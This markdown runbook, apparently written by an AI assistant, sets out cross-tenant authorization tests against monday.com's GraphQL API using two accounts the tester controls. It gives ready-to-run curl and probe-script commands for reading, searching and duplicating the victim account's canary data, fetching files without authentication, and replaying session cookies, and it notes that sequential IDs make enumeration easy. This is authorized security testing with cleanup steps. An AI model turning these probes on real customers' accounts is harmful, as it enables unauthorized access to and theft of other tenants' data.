# Runbook — cross-tenant testing with the two API tokens

Real values filled in. Work top to bottom.

I cannot run any of this: this environment's egress proxy refuses every
monday.com host. Every command below is for you to run.

## The two accounts

| | account B | account C |
|---|---|---|
| `actid` | **36786355** | **36786534** |
| `uid` | **115702202** | **115703279** |
| slug | `zxczxc-cast` | (new) |
| token scope | `me:write` | `me:write` |
| region | euc1 | euc1 |

Both tokens are `me:write` — full read **and write** on their account. Both carry
no `exp` claim. Treat them as live credentials: revoke both when you finish
(avatar → Developer → My Access Tokens → revoke).

```bash
cd recon/monday.com
export TOKEN_B='<the token with uid 115702202>'
export TOKEN_C='<the token with uid 115703279>'
```

Attacker = **B**. Victim = **C**. Never the reverse in a report — pick one
direction and stay consistent so the evidence is unambiguous.

---

## Step 1 — plant canaries in account C

In the C browser session, by hand:

1. Board named `CANARY-BOARD`
2. Item on it named `CANARY-ITEM-8f2a91`
3. Upload `canary.txt` to that item, containing the single line `CANARY-8f2a91`
4. Post a comment on the item: `CANARY-UPD-8f2a91`

## Step 2 — collect C's ids, using C's own token

```bash
q() { curl -s https://api.monday.com/v2 -H "Authorization: $1" \
        -H 'Content-Type: application/json' -d "{\"query\":\"$2\"}"; }

# board + items + updates + assets in one go
q "$TOKEN_C" '{ boards(limit: 5) { id name items_page(limit: 5) { items { id name
    updates { id text_body } assets { id name } } } } }'

# confirm identity
q "$TOKEN_C" '{ me { id name email account { id slug } } }'
```

Record what comes back:

```bash
export C_BOARD='<CANARY-BOARD id>'
export C_ITEM='<CANARY-ITEM id>'
export C_UPDATE='<CANARY-UPD id>'
export C_ASSET='<canary.txt asset id>'
export C_ACCOUNT=36786534
export C_USER=115703279
```

## Step 3 — the sweep: B's token, C's ids

```bash
export MONDAY_TOKEN="$TOKEN_B"
python3 tools/gqlprobe.py whoami          # must print uid 115702202 / actid 36786355

python3 tools/gqlprobe.py idor \
  --b-asset   "$C_ASSET" \
  --b-board   "$C_BOARD" \
  --b-item    "$C_ITEM" \
  --b-update  "$C_UPDATE" \
  --b-account "$C_ACCOUNT" \
  --connection-id 100
```

**Anything that returns `CANARY-8f2a91` is a finding.**

The single highest-value one, by hand so you can see the raw response:

```bash
curl -s https://api.monday.com/v2 -H "Authorization: $TOKEN_B" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":\"{ assets(ids: [\\\"$C_ASSET\\\"]) { id name file_size public_url uploaded_by { id name email } } }\"}"
```

If that returns a `public_url`, fetch it with **no auth header at all** — a file
download with no credentials is the impact, and it is what makes the report land:

```bash
curl -s '<the public_url>'     # expect: CANARY-8f2a91
```

## Step 4 — hidden schema surface

```bash
export MONDAY_TOKEN="$TOKEN_B"
python3 tools/gqlprobe.py probe
```

Then for anything not `ABSENT`, search for C's canary string from B's token:

```bash
q "$TOKEN_B" '{ search { updates(query: \"CANARY-8f2a91\") { results { id indexed_data { body board_id } } } } }'
q "$TOKEN_B" '{ search { users(query: \"CANARY\") { results { indexed_data { name email } } } } }'
```

## Step 5 — the auth-from-arguments query

```bash
q "$TOKEN_B" "{ dependency_column_config(board_id: \\\"$C_BOARD\\\", account_id: \\\"$C_ACCOUNT\\\", user_id: \\\"$C_USER\\\") { board_id dependency_columns { id account_id board_id data } } }"
```

And the mismatch variant — your own board, C's identity:

```bash
q "$TOKEN_B" "{ dependency_column_config(board_id: \\\"<YOUR B BOARD>\\\", account_id: \\\"$C_ACCOUNT\\\", user_id: \\\"$C_USER\\\") { board_id dependency_columns { id } } }"
```

## Step 6 — the write test (non-destructive, run last)

```bash
q "$TOKEN_B" "mutation { duplicate_item(board_id: \\\"<YOUR B BOARD>\\\", item_id: \\\"$C_ITEM\\\", with_updates: true) { id name url } }"
```

Copies rather than moves, so C loses nothing. If `CANARY-ITEM-8f2a91` appears on
B's board, that is item theft across tenants.

## Step 7 — session lifetime (uses the browser cookies, not these tokens)

The session JWTs carry no `exp`. Whether that matters depends on server-side
enforcement, so test it:

1. Save `dapulse_session` and `jwt_session_token` from account B's browser.
2. Log out of account B in that browser.
3. Replay a request with the saved cookies.

Still 200 after logout → session invalidation is broken, and that is a finding on
its own. Rejected → the JWT claim is cosmetic and there is nothing here.

Second test: leave a session untouched for a week and replay it. Still valid →
no idle timeout.

---

## Bonus datapoint for the impact section

The two accounts were created 112 seconds apart:

| | B (10:47:59Z) | C (10:49:51Z) | delta |
|---|---|---|---|
| `actid` | 36786355 | 36786534 | **+179** |
| `uid` | 115702202 | 115703279 | **+1077** |

≈ 1.6 accounts and 9.6 users per second, allocated sequentially. If any of the
ID-taking endpoints turns out to be unauthorised, that is the number to put in
the impact section: the identifier space is sequential and densely populated, so
enumeration reaches real customer data immediately rather than hunting for it.

State that as an inference from two samples, not as a measured platform rate.

---

## When you are done

```bash
rm -f .cookies-a .cookies-b
```

Revoke both API tokens, and log out of every account. Both tokens are `me:write`
and neither expires on its own.
